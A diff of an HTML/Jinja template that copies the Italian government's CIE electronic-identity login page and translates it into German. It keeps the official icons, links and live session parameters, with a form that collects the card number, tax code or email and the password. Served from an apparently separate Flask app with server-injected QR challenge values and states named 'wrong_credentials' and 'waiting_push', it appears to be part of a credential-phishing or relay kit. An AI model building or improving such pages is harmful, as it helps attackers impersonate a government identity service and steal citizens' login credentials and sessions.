@@ -1,6 +1,6 @@
 <!DOCTYPE html>
-<!-- saved from url=(0061)https://idserver.servizicie.interno.gov.it/idp/login/livello2 -->
-<html class="h-100" lang="it"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<!-- saved from url=(0390)https://idserver.servizicie.interno.gov.it/idp/login/livello2?eccLang=de&opId=_e3d57b6001fe1cf6a2d8d719064c4660_521b7f3209e46c1e363c3a68c7714fab&challenge=NGFLXVd%2FPwnh%2F8v1ihMy74GjDzQijXb5te%2F0%2B8on&level=2&SPName=https%3A%2F%2Fidpcwrapper.crs.lombardia.it%2Fmetadata%2Fsp-metadata-cie.xml&SPLogo=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png&value=e1s2 -->
+<html class="h-100" lang="de"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 		<title>CIE Login</title>
 		
 
@@ -9,8 +9,8 @@
 
 <meta http-equiv="X-UA-Compatible" content="IE=Edge">
 
-<link rel="stylesheet" href="{{url_for('static', filename='cie_wrong_credentials_it/bootstrap-italia.min.css')}}">
-<link rel="stylesheet" href="{{url_for('static', filename='cie_wrong_credentials_it/l12.css')}}">
+<link rel="stylesheet" href="{{ url_for('static', filename='cie_login_it/bootstrap-italia.min.css') }}">
+<link rel="stylesheet" href="{{ url_for('static', filename='cie_login_it/l12.css') }}">
 
 <link rel="apple-touch-icon" sizes="57x57" href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/apple-touch-icon-57x57.png">
 <link rel="apple-touch-icon" sizes="60x60" href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/apple-touch-icon-60x60.png">
@@ -24,7 +24,7 @@
 <link rel="icon" type="image/png" sizes="32x32" href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/favicon-32x32.png">
 <link rel="icon" type="image/png" sizes="192x192" href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/android-chrome-192x192.png">
 
-<script src="{{url_for('static', filename='cie_wrong_credentials_it/bootstrap-italia.bundle.min.js')}}"></script><style>
+<script src="{{ url_for('static', filename='cie_login_it/bootstrap-italia.bundle.min.js') }}"></script><style>
 /* Titillium+Web:300,400,600,700 */
 
 /* latin-ext */
@@ -210,7 +210,6 @@
   unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
 }
 </style>
-
 <script>
   // values injected by server (expiry_ms is absolute server epoch ms)
   window.__qrExpiryMs = {{ expiry_ms|default('null')|tojson }};
@@ -219,9 +218,9 @@
   // use a per-challenge key too if you still want localStorage fallback (optional)
   window.__qrChallenge = {{ challenge|default('')|tojson }};
 </script>
-<script src="{{url_for('static', filename='cie_wrong_credentials_it/l12.js.jsp')}}"></script>
+<script src="{{ url_for('static', filename='cie_login_it/l12-deu.js.jsp') }}"></script>
 
-<script src="{{url_for('static', filename='cie_wrong_credentials_it/is.js')}}"></script>
+<script src="{{ url_for('static', filename='cie_login_it/is.js') }}"></script>
 
 
 	</head>
@@ -233,7 +232,7 @@
 
 			<div class="row it-header-slim-wrapper-content ">
 				<div class="col">
-					<img src="{{url_for('static', filename='cie_wrong_credentials_it/ministero')}}@2x.png" alt="Ministero dell&#39;Interno">
+					<img src="{{ url_for('static', filename='cie_login_it/ministero@2x.png') }}" alt="Ministero dell&#39;Interno">
 				</div>
 				
 				<div class="col-1 text-right">
@@ -246,17 +245,17 @@
 		<ul class="navbar-nav">
 			<li class="nav-item dropdown">
 
-				<a class="nav-link dropdown-toggle" href="https://idserver.servizicie.interno.gov.it/idp/login/livello2#" role="button" id="eccLangNavDropdown" data-toggle="dropdown" aria-expanded="false" aria-haspopup="true">
+				<a class="nav-link dropdown-toggle" href="#" role="button" id="eccLangNavDropdown" data-toggle="dropdown" aria-expanded="false" aria-haspopup="true">
 					<span class="sr-only">Selezione lingua: lingua selezionata</span>
-					<span> ITA </span>
-					<svg class="icon-expand  icon icon-xs"><use href="{{url_for('static', filename='cie_waiting_push_it/sprite.svg')}}#it-expand"></use></svg>
+					<span> DEU </span>
+					<svg class="icon-expand  icon icon-xs"><use href="{{url_for('static', filename='cie_login_it/sprite.svg')}}#it-expand"></use></svg>
 				</a>
 
 				<div class="dropdown-menu" role="region" aria-labelledby="eccLangNavDropdown">
 					<div class="link-list-wrapper">
 						<ul class="link-list">
-							<li><a id="switch2it" class="dropdown-item list-item current" href="https://idserver.servizicie.interno.gov.it/idp/login/livello2?eccLang=it"><span>ITA <span class="sr-only">selezionata</span></span></a></li>
-							<li><a id="switch2de" class="dropdown-item list-item" href="https://idserver.servizicie.interno.gov.it/idp/login/livello2?eccLang=de"><span>DEU </span></a></li>
+							<li><a id="switch2it" class="dropdown-item list-item" href = "{{url_for('cie_level2', eccLang = 'it', opId=request.args.get('opId'), challenge=request.args.get('challenge'), level=request.args.get('level'), SPName=request.args.get('SPName'), SPLogo=request.args.get('SPLogo'), value=request.args.get('value') )}}"><span>ITA <span class="sr-only">selezionata</span></span></a></li>
+							<li><a id="switch2de" class="dropdown-item list-item current" href = "{{url_for('cie_level2', eccLang = 'deu', opId=request.args.get('opId'), challenge=request.args.get('challenge'), level=request.args.get('level'), SPName=request.args.get('SPName'), SPLogo=request.args.get('SPLogo'), value=request.args.get('value') )}}"><span>DEU </span></a></li>
 						</ul>
 					</div>
 				</div>
@@ -272,7 +271,7 @@
 				</div>
 				
 				<div class="col-4 col-lg-1 text-right">
-					<img src="{{url_for('static', filename='cie_wrong_credentials_it/CIE.png')}}" alt="Carta d&#39;identita&#39; elettronica">
+					<img src="{{ url_for('static', filename='cie_login_it/CIE.png') }}" alt="Carta d&#39;identita&#39; elettronica">
 				</div>
 			</div>
 					
@@ -295,9 +294,9 @@
 			<div id="title" class="mb-4 col">
 				<p class="c1">
 					<strong>
-						RICHIESTA D'ACCESSO CIE
+						ANFRAGE EINSTIEG CIE
 						
-							LIVELLO 2
+							STUFE 2
 						
 					</strong>
 				</p>
@@ -326,14 +325,14 @@
 		<div class="card-body">
 			<div class="row align-items-center">
 				<div class="col-2 ml-3">
-					<img class="img-fluid" src="{{url_for('static', filename='cie_wrong_credentials_it/android1.jpg')}}" alt="CIE Logo">
+					<img class="img-fluid" src="{{ url_for('static', filename='cie_login_it/android1.jpg') }}" alt="CIE Logo">
 				</div>
 				<div class="col-9">
 					<h3 class="card-title font-weight-semibold c4">Hai l'app CieID?</h3>
 					<p>Accedi più velocemente</p>
 				</div>
 			</div>
-			<a href="https://ios.idserver.servizicie.interno.gov.it/idp/login/app?opId=_dbe8204e9c0bac58729c4a7b81495fea_3665d92bf03b4b90ae2f0fdaa70578c1&amp;challenge=s8bIxIWZSxUtL4AICyCtb%2Bhbz6sDHD0p3AikHO%2Bh&amp;level=2&amp;SPName=https%3A%2F%2Fidpcwrapper.crs.lombardia.it%2Fmetadata%2Fsp-metadata-cie.xml&amp;SPLogo=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png&amp;value=e1s2" class="stretched-link"><span class="sr-only">Autorizza con l'App CieID</span></a>
+			<a href="https://ios.idserver.servizicie.interno.gov.it/idp/login/app?opId=_e3d57b6001fe1cf6a2d8d719064c4660_521b7f3209e46c1e363c3a68c7714fab&amp;challenge=NGFLXVd%2FPwnh%2F8v1ihMy74GjDzQijXb5te%2F0%2B8on&amp;level=2&amp;SPName=https%3A%2F%2Fidpcwrapper.crs.lombardia.it%2Fmetadata%2Fsp-metadata-cie.xml&amp;SPLogo=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png&amp;value=e1s2" class="stretched-link"><span class="sr-only">Autorizza con l'App CieID</span></a>
 		</div>
 	</div>
 	<!--end card-->
@@ -351,20 +350,14 @@
 												
 
 
-<h2>Entra con le tue credenziali CIE</h2>
+<h2>Anmelden mit Ihren Zugangsdaten CIE</h2>
 
 
 
 
 <div id="statusHandler" class="row mb-4 mx-n2 error">
 	
-		<div class="col-1 mr-2 my-auto">
-			<svg class="icon"><use xlink:href="{{url_for('static', filename='cie_waiting_push_it/sprite.svg')}}#it-close-circle"></use></svg>
-		</div>
-		<div class="col pl-2 my-auto">
-			
-			<p id="statusHandlerMsg">Credenziali non valide.</p>
-		</div>
+		<div class="col"><br><br></div>
 	
 </div>
 
@@ -376,12 +369,12 @@
                <div class="form-group col mb-5">
                     <div class="input-group">
                          
-                         <label for="username" class="sr-only active" style="transition: none;">Numero <abbr title="Carta d" identit&agrave;="" elettronica'="">CIE</abbr> o Codice fiscale o Email</label>
-                         <input type="text" class="form-control error" id="username" name="username" placeholder="Numero CIE o Codice fiscale o Email" value="" autocomplete="username" tabindex="1">
+                         <label for="username" class="sr-only active" style="transition: none;">Nummer der <abbr title="Carta d&#39;Identità Elettronica">CIE</abbr> oder Steuernummer oder E-Mail-Adresse</label>
+                         <input type="text" class="form-control" id="username" name="username" placeholder="Nummer der CIE oder Steuernummer oder E-Mail-Adresse" value="" autocomplete="username" tabindex="1">
 
                          <div class="input-group-append">
-                              <div class="input-group-text error" id="usernameIcon">
-                                   <a href="https://idserver.servizicie.interno.gov.it/idp/login/livello2#" data-toggle="modal" data-target="#helpCard"><svg class="icon icon-primary icon-sm"><use xlink:href="{{url_for('static', filename='cie_waiting_push_it/sprite.svg')}}#it-info-circle"></use></svg></a>
+                              <div class="input-group-text" id="usernameIcon">
+                                   <a href="https://idserver.servizicie.interno.gov.it/idp/login/livello2?eccLang=de&amp;opId=_e3d57b6001fe1cf6a2d8d719064c4660_521b7f3209e46c1e363c3a68c7714fab&amp;challenge=NGFLXVd%2FPwnh%2F8v1ihMy74GjDzQijXb5te%2F0%2B8on&amp;level=2&amp;SPName=https%3A%2F%2Fidpcwrapper.crs.lombardia.it%2Fmetadata%2Fsp-metadata-cie.xml&amp;SPLogo=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png&amp;value=e1s2#" data-toggle="modal" data-target="#helpCard"><svg class="icon icon-primary icon-sm"><use xlink:href="{{url_for('static', filename='cie_login_it/sprite.svg')}}#it-info-circle"></use></svg></a>
                               </div>
                          </div>
 
@@ -392,11 +385,11 @@
           <div class="form-row">
                <div class="form-group col mb-2">
                     <div class="input-group">
-                         <label for="password" class="sr-only active" style="transition: none;">Password</label>
-                         <input type="password" class="form-control input-password error" id="password" name="password" placeholder="Password" value="" autocomplete="current-password" tabindex="2">
+                         <label for="password" class="sr-only active" style="transition: none;">Passwort</label>
+                         <input type="password" class="form-control input-password" id="password" name="password" placeholder="Passwort" value="" autocomplete="current-password" tabindex="2">
                          <span class="password-icon" aria-hidden="true">
-                              <svg class="password-icon-visible icon icon-primary icon-sm d-none"><use xlink:href="{{url_for('static', filename='cie_waiting_push_it/sprite.svg')}}#it-password-visible"></use></svg>
-                              <svg class="password-icon-invisible icon icon-primary icon-sm "><use xlink:href="{{url_for('static', filename='cie_waiting_push_it/sprite.svg')}}#it-password-invisible"></use></svg>
+                              <svg class="password-icon-visible icon icon-primary icon-sm d-none"><use xlink:href="{{url_for('static', filename='cie_login_it/sprite.svg')}}#it-password-visible"></use></svg>
+                              <svg class="password-icon-invisible icon icon-primary icon-sm "><use xlink:href="{{url_for('static', filename='cie_login_it/sprite.svg')}}#it-password-invisible"></use></svg>
                          </span>
                     </div>
                     <div class="ipzs-validator" id="passwordError">&nbsp;</div>
@@ -404,18 +397,18 @@
           </div>
 
           <div class="mt-1 pb-1">
-               <p class="c2">Hai dimenticato la password? <strong><a href="https://www.cartaidentita.interno.gov.it/pgic/login/recupera-password" title="Richiedine una nuova." class="text-nowrap" target="_blank">Richiedine una nuova.</a></strong></p>
+               <p class="c2">Haben Sie Ihr Passwort vergessen? <strong><a href="https://www.cartaidentita.interno.gov.it/pgic/login/recupera-password" title="Neues Passwort anfordern" class="text-nowrap" target="_blank">Fordern Sie ein neues an</a></strong></p>
           </div>
           <div class="row buttons mt-4 pb-3">
                <div class="col-12 col-md-5 text-center mb-3 pr-md-3">
-                    <a href="https://idserver.servizicie.interno.gov.it/idp/Authn/GestioniErroriSSL?erroreSSL=error25&amp;conversation=e1s2" type="button" class="btn btn-outline-primary w-100 text-nowrap">Annulla</a>
+                    <a href="https://idserver.servizicie.interno.gov.it/idp/Authn/GestioniErroriSSL?erroreSSL=error25&amp;conversation=e1s2" type="button" class="btn btn-outline-primary w-100 text-nowrap">Abbrechen</a>
                </div>
                <div class="col-12 col-md-7 text-center">
-                    <button type="submit" class="btn btn-primary w-100">Procedi</button>
+                    <button type="submit" class="btn btn-primary w-100">Weiter</button>
                </div>
           </div>
           <div>
-               <p class="c2">Non hai ancora attivato le credenziali CIE? <strong><a href="https://www.cartaidentita.interno.gov.it/pgic/attivazione-credenziali-puk" title="Attiva ora le credenziali CIE" class="text-nowrap" target="_blank">Attivale ora</a></strong></p>			
+               <p class="c2">Sie haben Ihre CIE-Zugangsdaten noch nicht aktiviert? <strong><a href="https://www.cartaidentita.interno.gov.it/pgic/attivazione-credenziali-puk" title="Aktivieren Sie jetzt die CIE-Zugangsdaten" class="text-nowrap" target="_blank">Aktivieren Sie sie jetzt</a></strong></p>			
           </div>	
      </form>
 
@@ -439,12 +432,12 @@
           <div class="modal-dialog modal-lg" role="document">
                <div class="modal-content ">
                     <div class="modal-header ipzs-bb">
-                         <h3 class="modal-title">Dove trovo questi dati?<br>
-                              <small class="c3">Potrai utilizzare indifferentemente come username:</small>
+                         <h3 class="modal-title">Wo finde ich diese Daten?<br>
+                              <small class="c3">Sie können einen der folgenden Benutzernamen verwenden:</small>
                          </h3>
                          <button class="close" type="button" data-dismiss="modal" aria-label="Close">
                          <svg class="icon icon-primary">
-                              <use xlink:href="{{url_for('static', filename='cie_waiting_push_it/sprite.svg')}}#it-close-circle"></use>
+                              <use xlink:href="{{url_for('static', filename='cie_login_it/sprite.svg')}}#it-close-circle"></use>
                          </svg>
                          </button>
                     </div>
@@ -453,21 +446,21 @@
                          <div class="container">
                               <div class="row">
                                    <div class="col-12 col-lg-6">
-                                        <p class="pb-2 text-uppercase"><strong>Numero <abbr title="&quot;Carta" d&#39;identit&agrave;="" elettronica&quot;="">CIE</abbr></strong></p>
-                                        <p class="text-center text-lg-left"><img src="{{url_for('static', filename='cie_wrong_credentials_it/fac-simile-cie.png')}}" alt="fac-simile carta d&#39;identità" class="img-fluid"></p>
-                                        <p class="py-4 py-lg-2 c3">È il numero che trovi in alto a destra sulla carta d'identità elettronica. Es. CA00000AA</p>
+                                        <p class="pb-2 text-uppercase"><strong>NUMMER DER CIE/EIK</strong></p>
+                                        <p class="text-center text-lg-left"><img src="{{ url_for('static', filename='cie_login_it/fac-simile-cie.png') }}" alt="fac-simile carta d&#39;identità" class="img-fluid"></p>
+                                        <p class="py-4 py-lg-2 c3">Es ist jene Nummer, die Sie in der oberen rechten Ecke Ihrer elektronischen Identitätskarte finden. Bsp. CA00000AA</p>
                                    </div>
                                    <div class="col-12 col-lg-6">
-                                        <p class="pb-2 text-uppercase"><strong>Codice fiscale</strong></p>
-                                        <p class="text-center text-lg-left"><img src="{{url_for('static', filename='cie_wrong_credentials_it/fac-simile-cie_retro.png')}}" alt="fac-simile retro carta d&#39;identità" class="img-fluid"></p>
-                                        <p class="py-4 py-lg-2 c3">È il codice di 16 caratteri alfanumerici che trovi sul retro della carta d'identità elettronica.</p>
+                                        <p class="pb-2 text-uppercase"><strong>Steuernummer</strong></p>
+                                        <p class="text-center text-lg-left"><img src="{{ url_for('static', filename='cie_login_it/fac-simile-cie_retro.png') }}" alt="fac-simile retro carta d&#39;identità" class="img-fluid"></p>
+                                        <p class="py-4 py-lg-2 c3">Es ist der 16-stellige alphanumerische Code, der sich auf der Rückseite Ihrer elektronischen Identitätskarte befindet.</p>
                                    </div>
                               </div>
                               <div class="row">
                                    <div class="col">
-                                        <p class="pb-2 pt-4 text-uppercase"><strong>Email</strong></p>
+                                        <p class="pb-2 pt-4 text-uppercase"><strong>E-MAIL-ADRESSE</strong></p>
                                         <p class="pb-2 c3">
-                                             È l'indirizzo e-mail che hai associato alla tua identità digitale CIE.<br>Puoi modificarlo all'interno dell'<a href="https://idserver.servizicie.interno.gov.it/idp/login/%22https://www.cartaidentita.interno.gov.it/pgic/login%22">Area personale</a>
+                                             Es ist die E-Mail-Adresse, die Sie mit Ihrer digitalen Identität CIE verknüpft haben. Sie können diese im persönlichen Bereich ändern
                                         </p>
                                    </div>
                               </div>
@@ -475,7 +468,7 @@
 
                     </div>
                     <div class="modal-footer">
-                         <button class="btn btn-primary btn-sm px-5" type="button" data-dismiss="modal">Chiudi</button>
+                         <button class="btn btn-primary btn-sm px-5" type="button" data-dismiss="modal">Schließen</button>
                     </div>
                </div>
           </div>
@@ -488,14 +481,14 @@
  
 
 <div id="qrWrapper" class="">
-	<h2>Entra con App CieID</h2>
-	<p class="c2">Se hai attivato le Credenziali CIE (livello 2) e hai certificato il dispositivo, apri l'App CieID ed inquadra il QR Code.</p>
+	<h2>Anmelden mit App CieID</h2>
+	<p class="c2">Wenn Sie die CIE-Zugangsdaten (Stufe 2) aktiviert haben und Ihr Gerät zertifiziert haben, öffnen Sie die App CieID und scannen Sie den QR Code.</p>
 
 	<div>
 		<div>
 			<div class="text-center" id="qrWrapperImg">
 				<figure id="qrFigure" class="overlay-wrapper">
-					<img class="img-fluid" src="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAPoAAAD6AQAAAACgl2eQAAAFPklEQVR4Xu2ZTaqkShCFQxzkrGoDgttwllsqN+DPBqq25MxtJLgBneVAjPeF91nVrxsamkwaHlwp7r1dHjAz8sSJc2zR31+T/PzNT9c34Ov6BnxdfwkQRTx/hltTtXPVqtxjvfpwE7lnA+jR2ONeUTcVcbtIqVN9eH1lA4SbL1+T3Wp1fzh9zYY5mjInoJGHW15aSRM6H7qmenh95gX4RamehJ6VeOnn+umXrAAqWa6ufArP1ddUrk1otfxvqRMBIg1P/OXzI2F+vftHALuWQ0po9mh0kMBO77F+nTfyAKLcpBwnHlqfz636KTycMbzPBVDIXD7pmrg/vBTKGdVrsxfzZ5vJgGUVHWPVTrQkTKg6F3pr2PLfbaYDYnn2/n5rYN1+nyvx0JsTDFcdkgG63yR0TopozTK4cC5GD7dnA8SqmJfB14dIO3FX7vPe+b2Y3pxMB4Sbqw+3HJ4jQ2fqlfVAQrdclcwA4NGITB/Z7LJN5TjvRaw6eR9WOoBH77ZBlc7DZFi9bLO0+qZ9OmDRiU95QLyp3makvno0VRH3q5LJABV0cpzlIYh8dfP8NDxVvQiTDmBf5dPx6GW0yWV/P20912GlA2LgofDtPtcQj8nYnQvr1XQsF6A9OfBoFqWMEUGjSWvWkA9QiQQ4xthtoxRzxYg8HFT/9GYqQOtt0lWM1T13OSkEB6mZ3oeVDoADVedLpLJQhCu0EeLx/bXNdECsGCLFvPez9eZorEAB9uJzWOkAG+5qTzf/03nb8j3CEJaRCaCsQTpnXfn0ukUan97h86lkMkCHL+Gdq5vDAtGkKIwJ/rWGdABkxijq2jCC6y2Wr8hwrGnS6zSTAXHBuQ3C5NUDl+iUJmrnEmL32QD1a1IkZRVYUd0nLBz0C8Wb1ekAOxpcItrCTplWDMdl9ZzVpfYZABBsvzmkrOpwpPxzQhB2WHeVOh1QMRPv59FsVJUAYjbeTMu1hnQAR086gHXYOR2cQDwR+zIfoBykRoFfhIKG+WXWl4VZefMBLJe5vWuWLe5ikaoeLEy9aZ8OQLJwufCZDAU4dKbGsO5TyVSAVazc5vCA2Ez2BhGo7hELEe65AOZImVMM9L1zYMyrkKrQT80FYFTRj4zFiIeneugYUxiRyQhgFAouZZw4rx0vxOS1KW8WIhdAN/xhpHeQl9IY7qmk5Z2r1MkARSfxD2iLieThWQ/+Ac25tpkBIMVkc/YgLJuqBFMYR9J58yEdUA9Ecm9MPs1PZayOePi3n8wA4BeHNQh8AFyP2GBI6D+9mQogd1j6C+fMxQjxbanzsjaX2mcAICkUkMY3Uz3OtjtSM8H2IkwywCppMbzlyDA/JE3hlpj1ygUwscKf0PXkWTPwoxqrCbn5ANwihnMLOxRImhvW3ZUfVqcDzHkuZzpAuGp8I8tYbTh+CJMOeFq/m6/Gbo3m3vE/CM5nbiYDaEai32KmzkSGMGWRpDNYLoB1OtNwMzWuDxtbVsmnXNY9HRCNEri4fl6OxrItan9r1FiRDbAMprqLldTy+Bmp6COLObkAapSY9XA4LkuFD88a+PkZKMkAJq+95zHTKHI2qeCrh7cjTQeoLWP1JOVyM1ONZqL8ONK3wiQDzreshPFR996qyjGF1nxdrdkACs34/mjMbmEk7vZSdP/46gwALDTpyZ5IOhBfWTpw+kOpswDI5jZw4XMB2U7Hu5lLyQjAOSwvWwZqY29LKOb5Hyu5ANRwv3mLtNjFgcb3UsS9fQ/3DIDzvb0BLH10pAOmvDOX0ucC/Pb6Bnxd34Cv6/8B+AeYSlKUkYy7nAAAAABJRU5ErkJggg==" alt="QR code">
+					<img class="img-fluid" src="data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAPoAAAD6AQAAAACgl2eQAAAFQUlEQVR4Xu2YQYrzOBCFy3jhXXIBg67hna4UXyBOLmBfyTtfQ+AL2DstRGq+cv64e/4fBgaJgYE2TXCc10hVevXqlUX/+Zrl9ye/XT+A9/UDeF//ESCK+LZfgkh7a1KvclW3SbgIN6UA+urSpVmf0W1dKz5Vsd5VX16nYoBw8aFaWmnCEFMf60eXROpXV5cEdLpruC7u0bW9pmF25HAsC/B8tn1cN7K38JxMrkUBZFJHH+5dunf6EJFmnZb676nOBIh0rPjH33fC/PnrvwLYtW5NuAlnxB7WB6tH28AvVucDokDgm8hd9FhXhtnw/dIOpQAKh9MQQx/DzbeVrsphdYkYf2WyAMDiGjurTfHr6NPd6B3Ef8LMB1CJ8/qcdYcYkqq5Vk0Xn6Q7TzMf0N47tzX1tLSXrh59exe+rq/m3EM+wO1vBetsM0QNEoZXVkGFAErJ1GOzKgEaw4k3VFpvPgylALHWRfoFpoU7ajYTb7p0BPuV6myAkECdWVGg3KDEu9q/6DfaZwIUnSe0+iU6zegkYDBtFc/yLwCg5PdZWP3SudGk3r5yXucecgEczYKkoMPuuVCk68Tqs3saNwoBrHe4za9PTdK01RKGWSHD3bsP5QoAYHVF9qTe4BvEm53tx7p8IUB09I59Rr7cPiMsFCYtcn0JuS0FoAbrrTHkpOlmZG4v0l6NhKUAcIBtSI95oHyUGwKvX80nk/kATdcZf5IGe1g/50DJ8LWaTfDLANiDSSLB2nNogJEb0AT9SnUuAGGMK3zul3Tz4C2TIqEyTCkAi8qtE/gwNqiZbhg5j8hoMQAWS60JvjqEy+0WnXs0+o3V+YB0a7h302xGi57VQ7aF2jz1IRugbTWzekIbhwUyg6np9f189qx8AOYKF+24oR4rwozrrvVD7EkZQGyv0T18EEx1PBIY0eR0RTCLAbDu4dZYUC+z06b2k/LwbGr5AJarOakrtoG2tcilwVu7KZ4Kkw8wo3u0FQaQY2rDcXkaWfuhXDZA+RWLgvMJtgdogODYZj6ZLACAwAmvS3MfO2HktM6LE46nf8gH0HapTRTA3O+D0YOGEls5x6h8QLTRAz6M4jDVjLSHI9XDF5UCkDSCwgjRsNBGrJ1NB+LDeZrZAMyhWLFjG8ikwHB8Lwb1i9XZgHVfnHm5wzyMgryQRgTno/YFAMa05yxVNAXecSyzI1gzXaUAiHDEaDnzJBHzw9LMU+3Fn6zOB9gk/jq8NJRmgLK2u1iX/+whH0D7SJemPrhHvA6Rwdrdm7O5ZwNMT44+xXTQtFcaLo5xYTx0WgyAy61J4GYb4Iwgm2725upkdTZAcdFmcbEopjMNW8KRWqP85CEbENHJFUfNVDt6GpazqbbDZp/lnw+woI4miAKjYHQux06mb6nOBajjdFD7nqGGLkznZUJ/G/hSAHOkNsP2Smcne6h9MAths1spANrOdIOIUTu4oPqBIAsDwqc2CwCs4d48CoNdb602GaMaYtdPqvMBjIHB6mVhjA02gyz0R2aQczooAHjY6ynmDnuji1puFuB6uN9SALUEsuKCyODi1gdnJ3T8U+3zAShYIEDG8/ebvT4iNTjSszazAWrn9bQY8dL6XMzXiZXSl8LkAuwNksO53SVJx0gFH2xSYwjVYgDFHNJ20V4+p6M8K7OpJ6vzAfZSfYoMUOYfKjUdQGG+TQdFAFItgXmf5nWMme0xuJ1zVhGARXpsw/hmLkihR0GALbfbyAkfcOw62QyFVykIELNV3t4ZSiN3GI6d8/a6dSgF+MfrB/C+fgDv6/8B+AuoXsKBohh0ZwAAAABJRU5ErkJggg==" alt="QR code">
 					<figcaption id="qrOverlay" class="overlay-panel overlay-panel-fullheight overlay-black" style="display:none;"><span class="my-auto mx-auto"></span></figcaption>
 				</figure>
 				<noscript>
@@ -504,19 +497,19 @@
 			</div>
 		</div>
 		<div id="qrMsgWrapper">
-			<p class="text-center c2">Se non vuoi usare la modalità semplificata ed hai già registrato la tua carta su App CieID (livello 3), seleziona "Entra con lettura carta CIE" qui sotto.</p>
-			<p class="text-center"><span class="c2">Validità codice:</span><strong><span id="spanSec"> 0':43"</span> </strong></p>
+			<p class="text-center c2">Wenn Sie den vereinfachten Modus nicht nutzen möchten und Ihre Karte bereits in der CieID-App (Stufe 3) registriert haben, wählen Sie hier unten "Mit Auslesen der CIE-Karte anmelden"</p>
+			<p class="text-center"><span class="c2">Gültigkeit Code:</span><strong><span id="spanSec"> 1':33"</span> </strong></p>
 		</div>													
 		<div id="qrGeneratorWrapper" class="text-center py5" style="display: none;">
 			<div class="pb-3">
-				<p class="text-center c2">Il QR Code non è più valido.<br>
-					<a href="https://idserver.servizicie.interno.gov.it/idp/login/livello2">Richiedilo di nuovo</a>
+				<p class="text-center c2">Der QR Code ist nicht mehr gültig<br>
+					<a href="https://idserver.servizicie.interno.gov.it/idp/login/livello2">Fordern Sie ihn erneut an</a>
 				</p>
 				<br>
 			</div>
 		</div>
 		<div id="postQRLink" style="display: none;">
-			<p class="text-center c2"><a href="https://idserver.servizicie.interno.gov.it/idp/login/livello1e2postqrcode" title="dopo aver scansionato il QR, clicca qui per proseguire">Clicca qui dopo aver autenticato tramite QR sulla APP</a></p>
+			<p class="text-center c2"><a href="https://idserver.servizicie.interno.gov.it/idp/login/livello1e2postqrcode" title="Nachdem Sie den QR-Code gescannt haben, klicken Sie hier um fortzufahren">Clicca qui dopo aver autenticato tramite QR sulla APP</a></p>
 		</div>
 	</div>
 </div>
@@ -579,7 +572,7 @@
 
 			<div class="row py-2">
 				<div class="col"><hr></div>
-				<div class="col-2 mx-n1 mx-lg-n3"><p class="c2 text-center or">oppure</p></div>
+				<div class="col-2 mx-n1 mx-lg-n3"><p class="c2 text-center or">oder</p></div>
 				<div class="col"><hr></div>
 			</div>
 
@@ -594,18 +587,18 @@
 				<div class="card-wrapper card-space">
 					<div class="card card-bg card-big p-3 py-sm-0 mx-sm-0 mx-md-1">
 						<div class="card-body p-0 p-sm-4">
-							<h2>Entra con lettura carta</h2>
+							<h2>Einloggen mit Lesen der Karte</h2>
 							
 							<div class="row pt-2">
 								<div class="col-12 col-lg-8 pr-lg-4">
 									<p class="c2">
-										Puoi entrare con la lettura della Carta (livello 3) da uno smartphone NFC con l'App CieID registrando la tua carta o da PC con il software CIE ed un lettore di smart card.
+										Sie können sich mit dem Lesen der Karte (Stufe 3) von einem NFC-Smartphone mit der CieID-App anmelden, indem Sie die Karte registrieren oder von einem PC mit der Software CIE und einem Smart-Card-Reader.
 										<br><br>
-										<strong><a href="https://www.cartaidentita.interno.gov.it/la-carta/identificazione-digitale/" target="_blank" title="Entra con app CieID">Scopri di più.</a></strong><br>
+										<strong><a href="https://www.cartaidentita.interno.gov.it/la-carta/identificazione-digitale/" target="_blank" title="Einstieg mit App CieID">Erfahren Sie mehr.</a></strong><br>
 									</p>
 								</div>
 								<div class="col-12 col-lg-4 pl-lg-4 mt-3 mt-md-0 text-center">
-									<a id="switch2L3" href="https://ios.idserver.servizicie.interno.gov.it/idp/login/app?opId=_dbe8204e9c0bac58729c4a7b81495fea_3665d92bf03b4b90ae2f0fdaa70578c1&amp;challenge=s8bIxIWZSxUtL4AICyCtb%2Bhbz6sDHD0p3AikHO%2Bh&amp;level=3&amp;SPName=https%3A%2F%2Fidpcwrapper.crs.lombardia.it%2Fmetadata%2Fsp-metadata-cie.xml&amp;SPLogo=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png&amp;value=e1s2&amp;nextUrl=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2FAuthn%2FX509&amp;name=conversation&amp;authnRequestString=_dbe8204e9c0bac58729c4a7b81495fea_3665d92bf03b4b90ae2f0fdaa70578c1&amp;OpText=Inserisci+le+ultime+4+cifre+del+PIN+ricevute+insieme+alla+tua+Carta+di+Identit%C3%A0+Elettronica+per+accedere+a+https%3A%2F%2Fidpcwrapper.crs.lombardia.it%2Fmetadata%2Fsp-metadata-cie.xml&amp;imgUrl=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png" class="btn btn-primary btn-image btn-card mb-2 text-nowrap w-100">Entra con lettura carta</a>
